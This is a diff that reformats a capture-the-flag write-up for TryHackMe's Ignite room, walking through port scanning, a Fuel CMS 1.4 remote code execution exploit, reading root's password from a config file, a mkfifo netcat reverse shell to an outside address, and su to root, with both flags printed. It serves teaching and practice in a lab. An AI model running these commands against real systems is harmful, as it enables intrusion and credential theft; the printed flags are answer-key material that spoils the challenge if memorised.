@@ -1,9 +1,10 @@
-### TryHackMe - Ignite CTF ###
+<h3 align="center">TryHackMe - Ignite CTF</h3>
 
 Room objectives: This write-up covers the Ignite CTF from TryHackMe, focusing on service enumeration, exploitation of a vulnerable CMS, and privilege escalation.
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Let's start by scanning for open ports running on the target, I used RustScan because it's faster than nmap but you can use nmap too.
+```
 ┌──(kali㉿kali)-[~]
 └─$ rustscan -a 10.66.152.0 --ulimit=5000
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -20,10 +21,11 @@ Scanning ports: The virtual equivalent of knocking on doors.
 [~] The config file is expected to be at "/home/kali/.rustscan.toml"
 [~] Automatically increasing ulimit value to 5000.
 Open 10.66.152.0:80
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Since we only have the port 80 open, we don't need to scan for all TCP ports with nmap and waste time, let's get some more information about the service.
-
+```
 ┌──(kali㉿kali)-[~]
 └─$ nmap -A -p 80 -sV 10.66.152.0        
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-17 18:55 EST
@@ -36,15 +38,21 @@ PORT   STATE SERVICE VERSION
 |_/fuel/
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Welcome to FUEL CMS
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
-Interesting, we have a CMS system called Fuel with a /fuel/ entry disallowed on robots.txt, you can see a login panel there, and if you go back to the previous page you can see 
-that there is a section that shows the default login and password of the CMS.. I tried and worked! But for now we don't actually need to have any credentials..
+Interesting, we have a CMS system called Fuel with a /fuel/ entry disallowed on robots.txt, you can see a login panel there: 
+
+<img width="397" height="273" alt="image" src="https://github.com/user-attachments/assets/16858626-c1a0-41a4-b957-329d2612b309" />
+
+If you go back to the previous page you can see that there is a section that shows the default login and password of the CMS.. I tried and worked! But for now we don't actually need to have any credentials..
+
+<img width="859" height="254" alt="image" src="https://github.com/user-attachments/assets/395840b0-4fb6-4ab7-b066-01a3c65bba19" />
+
 
 I searched for the word "fuel" on exploitdb and found some exploits, and if we go the main page of the website, we can see that the Fuel CMS is version 1.4 like most of the
 exploits shown below:
-
+```
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit -w fuel CMS
 ------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
@@ -57,18 +65,18 @@ Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                     
 Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                    | https://www.exploit-db.com/exploits/48741
 Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                        | https://www.exploit-db.com/exploits/48778
 Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)  
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 I tried the first 2 Remote Code Execution exploits, but they did not work for me, so let's try the third one..
-
+```
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit -m https://www.exploit-db.com/exploits/50477
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 After downloading it, you can use like I did and just change the IP from the URL address and it should work:
-
+```
 ┌──(kali㉿kali)-[~]
 └─$ python3 50477.py -u http://10.66.152.0 
 [+]Connecting...
@@ -80,14 +88,14 @@ contributing.md
 fuel
 index.php
 robots.txt
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Ok, right, we now have access to the target machine, and I tried to explore it manually, but it was taking too long, so I used the find command to help:
-
+```
 Enter Command $find / -r user.txt
 System
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Nothing... Really weird as they ask for the flag of this file.. I tried again but with "flag.txt" instead of "user.txt"
 
@@ -96,21 +104,23 @@ system/home/www-data/flag.txt
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 It worked, we can now cat the file and get the first flag:
-
+```
 Enter Command $cat /home/www-data/flag.txt
 system6470e394cbf6dab6a91682cc8585059b
-
+```
 User.txt:6470e394cbf6dab6a91682cc8585059b
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 To get the root flag, we need to escalate our privileges to root... I tried to see SUID permissions, tried to run linpeas, and I got really stuck on that, so I googled and found a
 .php file that stores the password of the user root
-
+```
 find / -name database.php 2>/dev/null
 /var/www/html/fuel/application/config/database.php
 www-data@ubuntu:/var/www/html$ cat database.php
+```
 
+```
 $db['default'] = array(
         'dsn'   => '',
         'hostname' => 'localhost',
@@ -132,37 +142,39 @@ $db['default'] = array(
         'failover' => array(),
         'save_queries' => TRUE
 );
-
+```
 The field above shows that the password from the user root is "mememe"!
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Ok, we now have the root credentials but we can't login with that yet because our shell doesn't allow that, so I opened another terminal in my machine and started listening the
 port 4444 as below:
-
+```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nc -lvnp 4444
+
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 You can choose any payload you want to, but the one that worked fine for me was mkfifo:
-
+```
 Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.140.135 4444 >/tmp/f
-
+```
 After receiving the connection on my machine, I upgraded my shell to PTY Python Shell
-
+```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 www-data@ubuntu:/var/www/html$
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 We can now switch to root user!
-
+```
 www-data@ubuntu:/var/www/html$ su root
 su root
 Password: mememe
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Then I tried another find command to search for the root flag:
-
+```
 root@ubuntu:/var/www/html# find / -name root.txt
 find / -name root.txt
 /root/root.txt
@@ -171,7 +183,7 @@ root@ubuntu:/var/www/html# cat /root/root.txt
 cat /root/root.txt
 b9bbcb33e11b80be759c4e844862482d 
 root@ubuntu:/var/www/html#
-
+```
 Root.txt:b9bbcb33e11b80be759c4e844862482d 
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
